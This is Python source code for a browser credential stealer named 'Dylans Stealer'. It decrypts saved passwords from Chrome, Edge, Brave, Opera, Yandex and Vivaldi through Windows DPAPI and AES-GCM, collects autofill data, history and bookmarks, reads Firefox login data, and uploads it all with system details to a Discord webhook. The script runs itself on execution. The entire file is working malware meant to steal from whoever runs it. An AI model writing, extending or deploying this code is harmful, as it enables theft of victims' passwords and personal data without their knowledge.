class DATA_BLOB(Structure):
    """Structure for Windows DPAPI data blob."""
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

# Global counters for summary
password_count, autofill_count, history_count, bookmark_count = 0, 0, 0, 0

# Global lists to accumulate content from all browsers for each data type
all_passwords_content = []
all_autofill_content = []
all_history_content = []
all_bookmarks_content = []


GLOBAL_INFO = get_global_info()

def load_url(hook_url, data='', headers=''):
    """Sends HTTP requests, used for Discord webhooks."""
    for i in range(8): # Retry up to 8 times
        try:
            req = Request(hook_url, data=data, headers=headers)
            with urlopen(req) as r:
                debug_print(f"Webhook response status: {r.status}")
                debug_print(f"Webhook response reason: {r.reason}")
            return r
        except Exception as e: # Catch any exception and retry
           debug_print(f"Error sending webhook (attempt {i+1}): {e}")
           pass
    debug_print("Failed to send webhook after multiple attempts.")


def get_data_from_blob(blob_out):
    """Retrieves data from a CryptUnprotectData blob."""
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    """Decrypts data using Windows DPAPI."""
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return get_data_from_blob(blob_out)
    return None # Return None if decryption fails

def decrypt_value(buff, master_key=None):
    """
    Decrypts encrypted values (e.g., passwords) using AES GCM.
    Handles 'v10' and 'v11' prefixes.
    NOTE: 'v20' is a newer encryption format used by some Chromium browsers and is NOT SUPPORTED
    by this script's current decryption capabilities. These entries will be flagged.
    """
    if not master_key or not buff:
        return "<DECRYPTION_ERROR: MISSING KEY/BUFFER>"
    
    if len(buff) < 15: # Minimum length for 'v10'/'v11' + IV + some payload
        debug_print(f"  [DECRYPT_VALUE] Buffer too short for v10/v11 format. Length: {len(buff)}")
        return "<DECRYPTION_ERROR: BUFFER_TOO_SHORT>"

    starts = buff[0:3].decode(encoding='utf8', errors='ignore')
    
    if starts == 'v10' or starts == 'v11':
        try:
            iv = buff[3:15]
            payload = buff[15:]
            
            if len(payload) < 16: # Payload must be at least 16 bytes for auth tag
                debug_print(f"  [DECRYPT_VALUE] Payload too short to contain auth tag. Length: {len(payload)}")
                return "<DECRYPTION_ERROR: PAYLOAD_TOO_SHORT>"

            ciphertext = payload[:-16]
            auth_tag = payload[-16:]

            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt_and_verify(ciphertext, auth_tag)
            
            try: 
                return decrypted_pass.decode('utf-8', errors='ignore')
            except Exception as e:
                debug_print(f"  [DECRYPT_VALUE] Error decoding decrypted value: {e}")
                return str(decrypted_pass) # Return as string representation of bytes if decoding fails
        except ValueError as ve: # Specific error for tag verification failure
            debug_print(f"  [DECRYPT_VALUE] AES decryption failed (Tag verification error): {ve}")
            return "<DECRYPTION_ERROR: AES_TAG_FAILED>"
        except Exception as e:
            debug_print(f"  [DECRYPT_VALUE] AES decryption failed: {e}")
            return "<DECRYPTION_ERROR: AES_FAILED>"
    elif starts == 'v20':
        debug_print(f"  [DECRYPT_VALUE] Detected 'v20' encryption format. This format is currently UNSUPPORTED for decryption by this script.")
        return "<DECRYPTION_ERROR: V20_FORMAT_UNSUPPORTED>"
    else:
        debug_print(f"  [DECRYPT_VALUE] Unknown encryption format. Starts: {starts}")
        return "<DECRYPTION_ERROR: UNKNOWN_FORMAT>"
       
def write_to_file(data_list, name):
    """Writes a list of strings to a specified text file in the TEMP directory."""
    path = os.path.join(temp, f"cr{name}.txt") # Use os.path.join for cross-platform compatibility
    try:
        with open(path, mode='w', encoding='utf-8') as f:
            for line in data_list:
                f.write(f"{line}\n")
        debug_print(f"Successfully wrote {len(data_list)} lines to {path}")
    except Exception as e:
        debug_print(f"Error writing file {path}: {e}")
    return path # Return the full path of the created file

def sqlite_query(path_db, temp_file_path, cmd):
    """
    Copies a SQLite database, executes a query, fetches data, and cleans up.
    Used for extracting data from browser databases.
    """
    try:
        # Attempt to remove the temp file if it exists from a previous failed run
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)
            debug_print(f"Removed stale temp DB: {temp_file_path}")

        shutil.copy2(path_db, temp_file_path) # Copy the database to a temporary location
        conn = sql_connect(temp_file_path)
        cursor = conn.cursor()
        cursor.execute(cmd)
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(temp_file_path) # Delete the temporary database copy
        debug_print(f"SQL query successful for {path_db}. Found {len(data)} rows.")
        return data
    except Exception as e:
        debug_print(f"Error executing SQL on {path_db}: {e}. Ensure browser is closed or file is accessible.")
        if os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
            except Exception as e_clean:
                debug_print(f"Error during temp file cleanup after SQL error: {e_clean}")
        return []

def get_master_key(base_path, master_key_rel_path, browser_name, profile_path):
    """Retrieves and decrypts the master key for Chromium-based browsers."""
    path_master_key = os.path.join(base_path, master_key_rel_path)
    if not os.path.exists(path_master_key):
        debug_print(f"  Local State path does not exist for master key: {path_master_key}")
        return None
    
    try:
        with open(path_master_key, 'r', encoding='utf-8') as f: 
            local_state = loads(f.read())
        master_key_b64 = local_state.get('os_crypt', {}).get('encrypted_key')
        if not master_key_b64:
            debug_print(f"  Encrypted master key not found in Local State: {path_master_key}")
            return None
        
        # Base64 decode and remove the 'DPAPI' prefix (b'DFS9' or 'v10'/v20 specific prefixes)
        # Typically, the first 5 bytes are 'DPAPI' indicator, then the actual encrypted key.
        master_key_encrypted_data = b64decode(master_key_b64)
        if master_key_encrypted_data.startswith(b'DPAPI'):
            master_key = CryptUnprotectData(master_key_encrypted_data[5:])
        elif len(master_key_encrypted_data) > 3 and master_key_encrypted_data[0:3].decode(errors='ignore') in ['v10', 'v11', 'v20']:
             # This is a newer format for the master key itself, try to unprotect it
             # Even if the content is v10/v11/v20, the master key *itself* should be DPAPI protected
             # If it's not starting with DPAPI it's usually an error or a different encryption for the master key
             debug_print(f"  [MASTER_KEY_DECRYPT] Master key itself does not start with 'DPAPI'. Attempting DPAPI decryption after prefix (e.g. v10, v11, v20).")
             master_key = CryptUnprotectData(master_key_encrypted_data[3:]) 
        else:
            debug_print(f"  [MASTER_KEY_DECRYPT] Unexpected master key encryption format prefix: {master_key_encrypted_data[:10]}...")
            master_key = None 

        if not master_key:
            debug_print(f"  Failed to decrypt master key for {browser_name} ({profile_path}).")
            return None
        debug_print(f"  Master key successfully decrypted for {browser_name} ({profile_path}).")
        return master_key
    except Exception as mk_err:
        debug_print(f"  Error loading/decrypting master key for {browser_name} ({profile_path}): {mk_err}")
        return None

def get_chromium_passwords(base_path, master_key_rel_path, profile_path, browser_name):
    """Extracts passwords from a Chromium-based browser's login data for a specific profile."""
    global password_count
    passwords_for_browser = []
    
    path_login_data = os.path.join(base_path, profile_path, "Login Data")
    debug_print(f"Attempting to extract Passwords from {browser_name} ({profile_path}) at {path_login_data}")
    
    if not os.path.exists(path_login_data):
        debug_print(f"  Login Data path does not exist: {path_login_data}")
        return []
    if os.stat(path_login_data).st_size == 0:
        debug_print(f"  Login Data file is empty: {path_login_data}")
        return []

    master_key = get_master_key(base_path, master_key_rel_path, browser_name, profile_path)
    if not master_key:
        debug_print(f"  Skipping password extraction for {browser_name} ({profile_path}) due to master key decryption failure.")
        return []

    try:
        temp_db_file = os.path.join(temp, "cr_pass" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db")
        data = sqlite_query(path_login_data, temp_db_file, "SELECT action_url, username_value, password_value FROM logins;")
        
        if not data: 
            debug_print(f"  Found 0 raw password entries for {browser_name} ({profile_path}).")
            return []

        browser_pass_decrypted_count = 0
        browser_pass_total_found_count = 0
        passwords_for_browser.append(f"\n--- Passwords from {browser_name} ({profile_path}) ---")
        for row in data:
            if row[0] and row[1]: # Ensure URL and Username are not empty
                decrypted_password = decrypt_value(row[2], master_key)
                browser_pass_total_found_count += 1
                if not decrypted_password.startswith("<DECRYPTION_ERROR:"):
                    passwords_for_browser.append(f"URL: {row[0]} | USERNAME: {row[1]} | PASSWORD: {decrypted_password}")
                    password_count += 1 # Increment global counter for successfully decrypted items
                    browser_pass_decrypted_count += 1
                else:
                    passwords_for_browser.append(f"URL: {row[0]} | USERNAME: {row[1]} | PASSWORD: {decrypted_password}") # Show decryption error in output
                    debug_print(f"  Password decryption failed for {row[0]}: {decrypted_password}") # More specific debug

        passwords_for_browser.append(f"--- {browser_pass_decrypted_count} passwords decrypted out of {browser_pass_total_found_count} found in {browser_name} ({profile_path}) ---")
        debug_print(f"  Finished Passwords for {browser_name} ({profile_path}). Decrypted: {browser_pass_decrypted_count}, Total Found: {browser_pass_total_found_count}. Global Decrypted Total: {password_count}")
    except Exception as e:
        debug_print(f"Error in get_chromium_passwords for {browser_name} ({profile_path}): {e}")
    return passwords_for_browser


def get_chromium_autofill(base_path, profile_path, browser_name):
    """Extracts autofill data from a Chromium-based browser's web data for a specific profile."""
    global autofill_count
    autofill_for_browser = []
    path_web_data = os.path.join(base_path, profile_path, "Web Data")
    debug_print(f"Attempting to extract Autofill from {browser_name} ({profile_path}) at {path_web_data}")
    if not os.path.exists(path_web_data):
        debug_print(f"  Web Data path for Autofill does not exist: {path_web_data}")
        return []
    if os.stat(path_web_data).st_size == 0:
        debug_print(f"  Web Data file for Autofill is empty: {path_web_data}")
        return []
    try:
        temp_db_file = os.path.join(temp, "cr_auto" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db")
        data = sqlite_query(path_web_data, temp_db_file,"SELECT name, value FROM autofill WHERE value NOT NULL;")
        if not data: return []
        browser_autofill_count = 0
        autofill_for_browser.append(f"\n--- Autofill Data from {browser_name} ({profile_path}) ---")
        for row in data:
            if row[0]:
                autofill_for_browser.append(f"NAME: {row[0]} | VALUE: {row[1]}")
                autofill_count += 1
                browser_autofill_count += 1
        autofill_for_browser.append(f"--- {browser_autofill_count} autofills found in {browser_name} ({profile_path}) ---")
        debug_print(f"  Finished Autofill for {browser_name} ({profile_path}). Found {browser_autofill_count} items. Total: {autofill_count}")
    except Exception as e:
        debug_print(f"Error in get_chromium_autofill for {browser_name} ({profile_path}): {e}")
    return autofill_for_browser

def get_chromium_history(base_path, profile_path, browser_name):
    """Extracts Browse history from a Chromium-based browser's history database for a specific profile."""
    global history_count
    history_for_browser = []
    path_history = os.path.join(base_path, profile_path, "History")
    debug_print(f"Attempting to extract History from {browser_name} ({profile_path}) at {path_history}")
    if not os.path.exists(path_history):
        debug_print(f"  History path does not exist: {path_history}")
        return []
    if os.stat(path_history).st_size == 0:
        debug_print(f"  History file is empty: {path_history}")
        return []
    try:
        temp_db_file = os.path.join(temp, "cr_hist" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db")
        data = sqlite_query(path_history, temp_db_file,"SELECT url FROM urls;")
        if not data: return []
        browser_history_count = 0
        history_for_browser.append(f"\n--- Browse History from {browser_name} ({profile_path}) ---")
        for row in data:
            if row[0]:
                history_for_browser.append(row[0])
                history_count += 1
                browser_history_count += 1
        history_for_browser.append(f"--- {browser_history_count} history entries found in {browser_name} ({profile_path}) ---")
        debug_print(f"  Finished History for {browser_name} ({profile_path}). Found {browser_history_count} items. Total: {history_count}")
    except Exception as e:
        debug_print(f"Error in get_chromium_history for {browser_name} ({profile_path}): {e}")
    return history_for_browser

def get_chromium_bookmarks(base_path, profile_path, browser_name):
    """Extracts bookmarks from a Chromium-based browser's bookmarks file for a specific profile."""
    global bookmark_count
    bookmarks_for_browser = []
    path_bookmarks = os.path.join(base_path, profile_path, "Bookmarks")
    debug_print(f"Attempting to extract Bookmarks from {browser_name} ({profile_path}) at {path_bookmarks}")
    if not os.path.exists(path_bookmarks):
        debug_print(f"  Bookmarks path does not exist: {path_bookmarks}")
        return []
    if os.stat(path_bookmarks).st_size == 0:
        debug_print(f"  Bookmarks file is empty: {path_bookmarks}")
        return []
    try:
        browser_bookmark_count = 0
        with open(path_bookmarks, 'r', encoding='utf8', errors='ignore') as f:
            data = loads(f.read())
            if data and 'roots' in data and 'bookmark_bar' in data['roots'] and 'children' in data['roots']['bookmark_bar']:
                bookmarks_for_browser.append(f"\n--- Bookmarks from {browser_name} ({profile_path}) ---")
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        if 'name' in i and 'url' in i:
                            bookmarks_for_browser.append(f"NAME: {i['name']} | URL: {i['url']}")
                            bookmark_count += 1
                            browser_bookmark_count += 1
                    except Exception as e:
                        debug_print(f"  Error processing bookmark entry for {browser_name} ({profile_path}): {e}")
                bookmarks_for_browser.append(f"--- {browser_bookmark_count} bookmarks found in {browser_name} ({profile_path}) ---")
        debug_print(f"  Finished Bookmarks for {browser_name} ({profile_path}). Found {browser_bookmark_count} items. Total: {bookmark_count}")
    except Exception as e:
        debug_print(f"Error in get_chromium_bookmarks for {browser_name} ({profile_path}): {e}")
    return bookmarks_for_browser


def get_firefox_passwords(base_path, browser_name="Firefox"):
    global password_count
    passwords_for_browser = []
    debug_print(f"Attempting to extract Passwords from {browser_name} at {base_path}")
    try:
        profiles_ini_path = os.path.join(base_path, "profiles.ini")
        if not os.path.exists(profiles_ini_path):
            debug_print(f"  profiles.ini not found for Firefox: {profiles_ini_path}")
            return []

        profile_paths = []
        with open(profiles_ini_path, 'r', encoding='utf-8') as f:
            profiles_content = f.read()
            matches = re.findall(r"Path=(.*?)\n", profiles_content)
            for match in matches:
                full_profile_path = os.path.join(base_path, match)
                if os.path.exists(full_profile_path) and os.path.isdir(full_profile_path):
                    profile_paths.append(full_profile_path)
        
        if not profile_paths:
            debug_print(f"  Could not find any profile paths in profiles.ini for Firefox.")
            return []

        for profile_path in profile_paths:
            debug_print(f"  Processing Firefox profile: {profile_path}")
            
            logins_json_path = os.path.join(profile_path, "logins.json")
            if not os.path.exists(logins_json_path):
                debug_print(f"  Firefox logins.json not found for profile: {logins_json_path}")
                continue
            if os.stat(logins_json_path).st_size == 0:
                debug_print(f"  Firefox logins.json file is empty: {logins_json_path}")
                continue

            browser_pass_count = 0
            passwords_for_browser.append(f"\n--- Passwords from {browser_name} ({os.path.basename(profile_path)}) ---")
            
            with open(logins_json_path, 'r', encoding='utf-8') as f:
                logins_data = loads(f.read())
                for login in logins_data.get('logins', []):
                    hostname = login.get('hostname', 'N/A')
                    username = login.get('encryptedUsername', 'N/A')
                    password = login.get('encryptedPassword', 'N/A')

                    # Note: Full Firefox password decryption requires external libraries (like `nss` for Python)
                    # and more complex logic involving NSS database interaction.
                    passwords_for_browser.append(f"URL: {hostname} | USERNAME (Encrypted): {username} | PASSWORD (Encrypted): {password} [Requires NSS Decryption]")
                    # We count these as "found" but note that they are not decrypted by this script.
                    password_count += 1 
                    browser_pass_count += 1
                    
            passwords_for_browser.append(f"--- {browser_pass_count} passwords found (encrypted) in {browser_name} ({os.path.basename(profile_path)}) ---")
            debug_print(f"  Finished Passwords for {browser_name} ({os.path.basename(profile_path)}). Found {browser_pass_count} items (encrypted).")

    except Exception as e:
        debug_print(f"Error in get_firefox_passwords for {browser_name}: {e}")
    return passwords_for_browser

# --- Main orchestrator function ---

def get_browsers_data(browser_paths_config):
    """
    Main function to orchestrate browser data extraction, consolidation,
    Discord webhook sending, and file cleanup.
    """
    global password_count, autofill_count, history_count, bookmark_count
    global all_passwords_content, all_autofill_content, all_history_content, all_bookmarks_content

    debug_print("\n--- Starting Data Collection for Dylans Stealer ---")
    # Reset counters and content lists for a fresh execution
    password_count, autofill_count, history_count, bookmark_count = 0, 0, 0, 0
    all_passwords_content.clear()
    all_autofill_content.clear()
    all_history_content.clear()
    all_bookmarks_content.clear()

    # Process Browsers
    for patt in browser_paths_config:
        base_path = patt[0]
        master_key_rel_path = patt[2] # For Chromium

        # Determine a user-friendly browser name
        browser_name = "Unknown Browser"
        if "Opera Software" in base_path:
            if "Opera GX Stable" in base_path: browser_name = "Opera GX"
            elif "Opera Stable" in base_path: browser_name = "Opera"
            elif "Opera Neon" in base_path: browser_name = "Opera Neon"
        elif "Google" in base_path:
            if "Chrome/User Data" in base_path: browser_name = "Chrome"
            elif "Chrome SxS" in base_path: browser_name = "Chrome SxS"
            elif "Chrome Beta" in base_path: browser_name = "Chrome Beta"
            elif "Chrome Dev" in base_path: browser_name = "Chrome Dev"
            elif "Chrome Unstable" in base_path: browser_name = "Chrome Unstable"
            elif "Chrome Canary" in base_path: browser_name = "Chrome Canary"
        elif "BraveSoftware" in base_path: browser_name = "Brave"
        elif "Vivaldi" in base_path: browser_name = "Vivaldi"
        elif "Yandex" in base_path: browser_name = "Yandex"
        elif "Microsoft/Edge" in base_path: browser_name = "Edge"
        elif "Mozilla/Firefox" in base_path: browser_name = "Firefox"

        debug_print(f"\n--- Processing Browser: {browser_name} ({base_path}) ---")
        
        if browser_name == "Firefox":
            all_passwords_content.extend(get_firefox_passwords(base_path, browser_name))
            # Note: Firefox Autofill, History, Bookmarks require different parsing methods
            # and are not included in this general Chromium-focused script.
        else: # Chromium-based browsers
            user_data_path_candidate = os.path.join(base_path, "User Data")
            profile_search_root = user_data_path_candidate if os.path.exists(user_data_path_candidate) else base_path

            # Dynamically find profile folders within the user data directory
            profile_folders = []
            if os.path.exists(profile_search_root):
                for item in os.listdir(profile_search_root):
                    full_item_path = os.path.join(profile_search_root, item)
                    # Check if it's a directory and likely a profile folder
                    if os.path.isdir(full_item_path) and (item == "Default" or item.startswith("Profile ") or item == "Guest Profile"):
                        profile_folders.append(item)
            
            if not profile_folders:
                debug_print(f"  No valid profile folders found for {browser_name} at {profile_search_root}. Attempting 'Default' directly.")
                profile_folders.append("Default") # Always try "Default" as a fallback

            for profile_folder in profile_folders:
                debug_print(f"  Processing Chromium profile: {profile_folder}")
                all_passwords_content.extend(get_chromium_passwords(profile_search_root, master_key_rel_path, profile_folder, browser_name))
                all_autofill_content.extend(get_chromium_autofill(profile_search_root, profile_folder, browser_name))
                all_history_content.extend(get_chromium_history(profile_search_root, profile_folder, browser_name))
                all_bookmarks_content.extend(get_chromium_bookmarks(profile_search_root, profile_folder, browser_name))

    debug_print("\n--- Finished Data Collection ---")
    debug_print(f"Total Passwords (Decrypted) found: {password_count}")
    debug_print(f"Total Autofills found: {autofill_count}")
    debug_print(f"Total Histories found: {history_count}")
    debug_print(f"Total Bookmarks found: {bookmark_count}")


    # After processing all browsers, write accumulated data to consolidated files
    file_paths_to_attach = []
    if all_passwords_content: file_paths_to_attach.append(write_to_file(all_passwords_content, 'passwords'))
    if all_autofill_content: file_paths_to_attach.append(write_to_file(all_autofill_content, 'autofill'))
    if all_history_content: file_paths_to_attach.append(write_to_file(all_history_content, 'history'))
    if all_bookmarks_content: file_paths_to_attach.append(write_to_file(all_bookmarks_content, 'bookmarks'))


    debug_print(f"Files generated for attachment: {file_paths_to_attach}")


    # Prepare the Discord payload with summary embed
    summary_embed = {
        "title": "Dylans Stealer | Browser Data Summary",
        "description": (
            f"<a:hira_kasaanahtari:886942856969875476> • **{password_count}** Browser Passwords Decrypted (Note: Some may be encrypted with unsupported format like v20)\n"
            f"<a:hira_kasaanahtari:886942856969875476> • **{autofill_count}** Browser Autofills Found\n"
            f":newspaper:  • **{history_count}** Browser Histories Found\n"
            f":bookmark: • **{bookmark_count}** Browser Bookmarks Found\n"
        ),
        "color": 16711680, # A nice, fiery red for impact
        "footer": {"text": f"Dylans Stealer | Data from {GLOBAL_INFO.split('`')[1]}",  
                   "icon_url": "https://i.imgur.com/jJES3AX.png"}
    }
    
    # All embeds combined into one list
    main_embeds = [summary_embed]
    
    # --- Construct the full multipart payload for Discord ---
    BOUNDARY = '----WebKitFormBoundary' + ''.join(random.choice('0123456789abcdef') for _ in range(16))
    full_multipart_payload = b''

    # Add the JSON payload part (for embeds and general content)
    json_payload_data = {
        "content": f"{GLOBAL_INFO}\n\n{PC_INFO}",
        "embeds": main_embeds,
        "username": f"Dylans Stealer",
        "avatar_url": "https://i.imgur.com/jJES3AX.png"
    }
    json_payload_bytes = dumps(json_payload_data).encode('utf-8')
    full_multipart_payload += (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="payload_json"\r\n'
        f'Content-Type: application/json\r\n\r\n'
    ).encode('utf-8') + json_payload_bytes + b'\r\n'

    # Add each file as a separate part in the multipart payload
    for idx, f_path in enumerate(file_paths_to_attach):
        file_name = os.path.basename(f_path)
        try:
            # Check if file exists and is not empty before attaching
            if os.path.exists(f_path) and os.stat(f_path).st_size > 0:
                with open(f_path, 'rb') as f:
                    file_content = f.read()

                full_multipart_payload += (
                    f"--{BOUNDARY}\r\n"
                    f'Content-Disposition: form-data; name="file{idx}"; filename="{file_name}"\r\n'
                    f'Content-Type: application/octet-stream\r\n\r\n'
                ).encode('utf-8') + file_content + b'\r\n'
                debug_print(f"Attached file: {file_name} (Size: {os.stat(f_path).st_size} bytes)")
            else:
                debug_print(f"Skipping attachment of empty/non-existent file: {file_name}")
        except Exception as e:
            debug_print(f"Error attaching file {file_name}: {e}")
            pass # If a file cannot be read, simply skip it silently

    full_multipart_payload += f"--{BOUNDARY}--\r\n".encode('utf-8')

    # Set headers for the multipart request
    multipart_headers = {
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    debug_print(f"\n--- Sending Webhook for Dylans Stealer ---")
    load_url(h00k, data=full_multipart_payload, headers=multipart_headers)
    debug_print(f"--- Webhook Sending Attempt Complete ---")

    # --- Cleanup Section: Erase the temporary files ---
    debug_print("\n--- Starting Cleanup ---")
    for file_name_base in ['passwords', 'autofill', 'history', 'bookmarks']:
        file_path = os.path.join(temp, f"cr{file_name_base}.txt")
        if os.path.exists(file_path):
            try:
                # os.remove(file_path) # Uncomment this line to delete temporary files after use
                debug_print(f"Kept temporary file: {file_path}") # For debugging, keeping files.
            except Exception as e:
                debug_print(f"Error handling file {file_path}: {e}")
        else:
            debug_print(f"Temporary file not found (not created): {file_path}")
    debug_print("--- Cleanup Complete ---")

    return

# Call the main data gathering function
def gather_all():
    """Defines browser paths and initiates the data gathering process."""
    # New proposed structure for browser_paths_config:
    # [0: base_path, 1: exe_name, 2: master_key_rel_path]
    # master_key_rel_path: Path to Local State relative to base_path (for Chromium)
    # For Firefox, master_key_rel_path is not directly applicable.
    browser_paths_config = [
        # Chromium-based Browsers - base_path points to the "User Data" equivalent
        # For Opera, the Local State is directly under AppData/Roaming/Opera Software/Opera GX Stable, etc.
        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "Local State"],
        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "Local State"],
        # Opera Neon typically has User Data subfolder
        [f"{roaming}/Opera Software/Opera Neon/User Data", "opera.exe", "Local State"],
        # Google Chrome
        [f"{local}/Google/Chrome/User Data", "chrome.exe", "Local State"],
        [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "Local State"],
        [f"{local}/Google/Chrome Beta/User Data", "chrome.exe", "Local State"],
        [f"{local}/Google/Chrome Dev/User Data", "chrome.exe", "Local State"],
        [f"{local}/Google/Chrome Unstable/User Data", "chrome.exe", "Local State"],
        [f"{local}/Google/Chrome Canary/User Data", "chrome.exe", "Local State"],
        # Brave
        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "Local State"],
        # Vivaldi
        [f"{local}/Vivaldi/User Data", "vivaldi.exe", "Local State"],
        # Yandex
        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "Local State"],
        [f"{local}/Yandex/YandexBrowserCanary/User Data", "yandex.exe", "Local State"],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data", "yandex.exe", "Local State"],
        [f"{local}/Yandex/YandexBrowserBeta/User Data", "yandex.exe", "Local State"],
        [f"{local}/Yandex/YandexBrowserTech/User Data", "yandex.exe", "Local State"],
        [f"{local}/Yandex/YandexBrowserSxS/User Data", "yandex.exe", "Local State"],
        # Microsoft Edge
        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "Local State"],
        # Firefox (base_path points to the directory containing profiles.ini)
        [f"{roaming}/Mozilla/Firefox", "firefox.exe", ""], # Master key path not directly used for Firefox
    ]

    get_browsers_data(browser_paths_config) # Initiate the data gathering

gather_all() # Initiate the malevolent process
